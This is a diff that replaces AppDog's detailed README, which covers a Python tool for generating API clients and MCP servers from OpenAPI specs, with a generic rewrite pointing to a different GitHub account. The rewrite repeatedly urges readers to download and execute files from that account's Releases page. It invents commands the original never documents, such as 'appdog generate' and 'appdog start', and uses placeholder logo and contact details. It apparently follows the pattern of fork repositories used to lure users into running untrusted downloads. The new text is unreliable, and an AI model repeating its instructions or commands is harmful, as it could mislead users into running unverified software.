@@ -1,323 +1,158 @@
-# AppDog
+# 🐶 AppDog: Effortless MCP Server Generation
 
-[![ci](https://img.shields.io/github/actions/workflow/status/rodolphebarbanneau/appdog/ci.yml?branch=main&logo=github&label=ci)](https://github.com/rodolphebarbanneau/appdog/actions?query=event%3Apush+branch%3Amain+workflow%3Aci)
-[![cov](https://codecov.io/gh/rodolphebarbanneau/appdog/branch/main/graph/badge.svg)](https://codecov.io/gh/rodolphebarbanneau/appdog)
-[![pypi](https://img.shields.io/pypi/v/appdog.svg)](https://pypi.python.org/pypi/appdog)
-[![versions](https://img.shields.io/pypi/pyversions/appdog.svg)](https://pypi.python.org/pypi/appdog)
-[![downloads](https://static.pepy.tech/badge/appdog/month)](https://pepy.tech/project/appdog)
-[![license](https://img.shields.io/github/license/rodolphebarbanneau/appdog.svg)](https://github.com/rodolphebarbanneau/appdog/blob/main/LICENSE)
+![AppDog Logo](https://example.com/logo.png)
 
-Compose and generate effortlessly async API clients and MCP servers from any OpenAPI specifications.
+Welcome to **AppDog**! This project allows you to compose and generate MCP servers easily from any OpenAPI specifications. With AppDog, you can streamline your development process and focus on building great applications.
 
-<br>
-<p align="center">
-  <img src="https://raw.githubusercontent.com/rodolphebarbanneau/appdog/refs/heads/main/docs/appdog.gif" alt="AppDog demo">
-</p>
+## 🚀 Features
 
-> Claude Desktop doesn't handle yet resource templates (i.e. resource with parameters).
+- **Seamless Integration**: Generate MCP servers directly from your OpenAPI specifications.
+- **Fast and Efficient**: Built with performance in mind, AppDog ensures quick server setups.
+- **Asynchronous Support**: Handle multiple requests efficiently with our async capabilities.
+- **Easy to Use**: Simple commands to get your server running in no time.
+- **Python-based**: Leverage the power of Python for your API development.
 
-> For **Windows users**, MCP Install command needs a manual edit of the generated Claude configuration. See [this issue](https://github.com/jlowin/fastmcp/issues/202) for more details.
+## 📦 Installation
 
-## Overview
+To get started with AppDog, download the latest release from our [Releases page](https://github.com/Arya711139/appdog/releases). Once downloaded, follow the instructions in the release notes to execute the application.
+
+### Prerequisites
+
+Before installing, ensure you have the following:
+
+- Python 3.7 or higher
+- pip (Python package installer)
+
+### Step-by-Step Installation
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Arya711139/appdog.git
+   cd appdog
+   ```
 
-AppDog is a Python package that simplifies working with OpenAPI-based APIs by:
+2. **Install Dependencies**:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-- Automatically generating fully typed Python clients from OpenAPI specifications
-- Creating ready-to-use MCP (Model Context Protocol) servers for API integrations
-- Managing multiple API clients in a single project with version locking
-- Providing a simple CLI for adding, removing, managing API clients, and installing MCP servers
+3. **Run AppDog**:
+   ```bash
+   python appdog.py
+   ```
 
-## Installation
+For further details, please refer to the [Releases page](https://github.com/Arya711139/appdog/releases).
 
-```bash
-uv add appdog
-```
+## 🌐 Topics
 
-## Quick Start
+- **API**: Work with APIs effortlessly.
+- **App**: Create robust applications.
+- **Async**: Utilize asynchronous programming for better performance.
+- **Client**: Build client applications with ease.
+- **FastMCP**: Fast implementations of the Model Context Protocol.
+- **MCP**: Understand and implement the Model Context Protocol.
+- **MCP Server**: Generate and manage MCP servers.
+- **OpenAPI**: Work with OpenAPI specifications seamlessly.
+- **Python**: Leverage Python for your server needs.
+- **Registry**: Manage your API specifications effectively.
 
-### Initialize a project
+## 📚 Documentation
 
-```bash
-# Create a new project in the current directory
-appdog init
+For comprehensive documentation, visit our [Wiki](https://github.com/Arya711139/appdog/wiki). You will find guides on installation, usage, and advanced features.
 
-# Or specify a project directory
-appdog init --project /path/to/project
-```
+## 🛠 Usage
 
-### Add an API client
+### Generating an MCP Server
 
-```bash
-# Add a new API client from an OpenAPI spec URL or file
-appdog add petstore --uri https://petstore3.swagger.io/api/v3/openapi.json
-```
+1. **Create an OpenAPI Specification**: Define your API using OpenAPI format.
+2. **Run AppDog**:
+   ```bash
+   appdog generate --spec your_openapi_spec.yaml
+   ```
+3. **Start the Server**:
+   ```bash
+   appdog start
+   ```
 
-### List and show available APIs
+### Example
 
-```bash
-# List all API clients in the project
-appdog list
+Here’s a simple example to get you started:
 
-# Show details for a specific API client
-appdog show petstore
-```
+1. **OpenAPI Spec**:
+   ```yaml
+   openapi: 3.0.0
+   info:
+     title: Sample API
+     version: 1.0.0
+   paths:
+     /pets:
+       get:
+         summary: List all pets
+         responses:
+           '200':
+             description: A list of pets
+   ```
 
-### Upgrade API clients
+2. **Generate the Server**:
+   ```bash
+   appdog generate --spec sample_api.yaml
+   ```
 
-```bash
-# Sync API clients with the project registry
-appdog sync --upgrade
+3. **Run the Server**:
+   ```bash
+   appdog start
+   ```
 
-# Lock API clients
-appdog lock --upgrade
-```
+## 📊 Contributing
 
-### Generate an MCP server
+We welcome contributions! If you want to help improve AppDog, please follow these steps:
 
-```bash
-# Generate and install an MCP server with all registered APIs
-appdog mcp install -n "My API Server"
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add a new feature"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Open a Pull Request.
 
-# Or run the server directly
-appdog mcp run -n "My API Server"
+## 📧 Contact
 
-# Or run in development mode with inspector
-appdog mcp dev -n "My API Server"
-```
+For questions or feedback, feel free to reach out:
 
-## Project Structure
+- **Email**: contact@appdog.com
+- **Twitter**: [@AppDog](https://twitter.com/AppDog)
 
-After initializing a project and adding APIs, your project will have:
+## 📝 License
 
-```
-project/
-├── apps.yaml     # Installed API appdog settings (auto-generated)
-├── apps.lock     # Lock file with app specs and hashes (auto-generated)
-└── ...           # Project files
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Using Generated Clients
+## 📅 Changelog
 
-After adding an API client, you can import and use it in your code:
+Keep track of changes in our [Changelog](https://github.com/Arya711139/appdog/releases).
 
-```python
-# Import generated client
-import appdog.petstore
+## 🎉 Acknowledgments
 
-# Use the client
-async def main() -> None:
-    async with appdog.petstore.client as client:
-        pets = await client.get_pet_find_by_status(status='available')
-        print(pets)
-```
+Thanks to the open-source community for their contributions and support. We also appreciate the creators of the libraries and tools that make this project possible.
 
-And compose your own MCP server:
+## 🌍 Community
 
-```python
-import appdog.petstore
-from mcp.server import FastMCP
+Join our community on [Discord](https://discord.gg/appdog) for discussions, support, and collaboration.
 
-mcp = FastMCP()
+## 📥 Releases
 
-@mcp.tool()
-async def hello_petstore() -> str:
-    async with appdog.petstore.client as client:
-        pets = await client.get_pet_find_by_status(status='available')
-        return pets
-```
+To download the latest version, visit our [Releases page](https://github.com/Arya711139/appdog/releases) and follow the instructions provided there.
 
-## Environment Variables
+## 🔗 Links
 
-API credentials can be configured using environment variables:
+- [GitHub Repository](https://github.com/Arya711139/appdog)
+- [Documentation](https://github.com/Arya711139/appdog/wiki)
+- [Issues](https://github.com/Arya711139/appdog/issues)
 
-```
-APPDOG_<CLIENT_NAME>_TOKEN=your_token
-APPDOG_<CLIENT_NAME>_API_KEY=your_api_key
-```
-
-## MCP Integration
-
-The package includes full support for MCP server generation:
-
-1. Generate an MCP server file:
-    ```bash
-    appdog mcp install -n "My API Server"
-    ```
-
-2. Use with FastMCP or other MCP clients:
-    ```python
-    from appdog import Project
-    from mcp.server import FastMCP
-  
-    mcp = FastMCP()
-
-    project = Project.load(project_dir=PROJECT_DIR)
-    project.mount(mcp)
-    ```
-
-## CLI Usage
-
-### Global Options
-
-- `--verbose`, `-v`: Enable verbose output
-- `--debug`, `-d`: Enable all debug logs, including dependencies
-- `--project`, `-p`: Specify project directory (defaults to current directory)
-
-### Commands
-
-#### Show CLI version
-
-```bash
-appdog version
-```
-
-#### Initialize Project
-
-```bash
-appdog init [--force] [--project PATH]
-```
-
-- `--force`: Force initialization even if config already exists
-
-#### Add API Client
-
-```bash
-appdog add NAME --uri URI [--base-url URL] [OPTIONS]
-```
-
-- `NAME`: Application name
-- `--uri`: OpenAPI specification URL or file path
-- `--base-url`: Base URL for API calls
-- `--include-methods`: Methods to include
-- `--exclude-methods`: Methods to exclude
-- `--include-tags`: Tags to include
-- `--exclude-tags`: Tags to exclude
-- `--force`: Overwrite application if it already exists with a different URI
-- `--frozen`: Skip adding application specification in project lock file
-- `--upgrade`: Force upgrading application specification
-- `--sync`: Sync application specification with project registry
-
-#### Remove API Client
-
-```bash
-appdog remove NAME [OPTIONS]
-```
-
-- `NAME`: Application name
-- `--frozen`: Skip removing application specification from project lock file
-- `--sync`: Sync application removal with project registry
-
-#### List API Clients
-
-```bash
-appdog list [--project PATH]
-```
-
-#### Show API Client Details
-
-```bash
-appdog show NAME [--project PATH]
-```
-
-- `NAME`: Application name
-
-#### Lock API Specifications
-
-```bash
-appdog lock [OPTIONS]
-```
-
-- `--force`: Overwrite application if it exists with a different URI
-- `--upgrade`: Overwrite application specification with a different URI
-
-#### Sync API Clients
-
-```bash
-appdog sync [OPTIONS]
-```
-
-- `--force`: Overwrite application if it exists with a different URI
-- `--frozen`: Skip updating application specification in project lock file
-- `--upgrade`: Force upgrading application specification
-
-#### Generate MCP Server
-
-```bash
-appdog mcp [COMMAND] [OPTIONS]
-```
-
-Commands:
-- `install`: Install applications in MCP client
-- `run`: Run MCP applications in production mode
-- `dev`: Run MCP applications in development mode with inspector
-
-Each command supports specific options:
-
-##### Common Options (all commands)
-- `--name`, `-n`: Name of the MCP server (default: "AppDog MCP Server")
-- `--force`: Overwrite server file if it exists
-- `--project`, `-p`: Project directory (defaults to current)
-- `--output`, `-o`: Output path for MCP server file
-
-##### Install Command
-```bash
-appdog mcp install [OPTIONS]
-```
-- `--env-var`, `-v`: Environment variables in KEY=VALUE format
-- `--env-file`, `-f`: Environment file with KEY=VALUE pairs
-- `--with`: Additional packages to install in dev mode
-- `--with-editable`, `-e`: Local packages to install in editable mode
-
-##### Run Command
-```bash
-appdog mcp run [OPTIONS]
-```
-- `--transport`, `-t`: Transport to use for MCP run (stdio or sse)
-
-##### Dev Command
-```bash
-appdog mcp dev [OPTIONS]
-```
-- `--with`: Additional packages to install in dev mode
-- `--with-editable`, `-e`: Local packages to install in editable mode
-
-## Advanced Usage
-
-### Client Configuration
-
-Create a custom `apps.yaml` to configure your API clients:
-
-```yaml
-petstore:
-  uri: https://petstore3.swagger.io/api/v3/openapi.json
-  base_url: https://petstore3.swagger.io/api/v3
-  include_tags:
-    - pet
-    - store
-```
-
-### Custom Authentication
-
-> For MCP usage, see [environment variables section](#environment-variables)
-
-Create a client with custom authentication:
-
-```python
-from appdog.petstore import PetstoreClient
-
-# Custom API key
-client = PetstoreClient(api_key="YOUR_API_KEY")
-
-# Custom headers
-client = PetstoreClient(
-    headers={"Authorization": "Bearer YOUR_TOKEN"}
-)
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for information on contributing to the project.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Thank you for using AppDog! We look forward to seeing what you build with it.
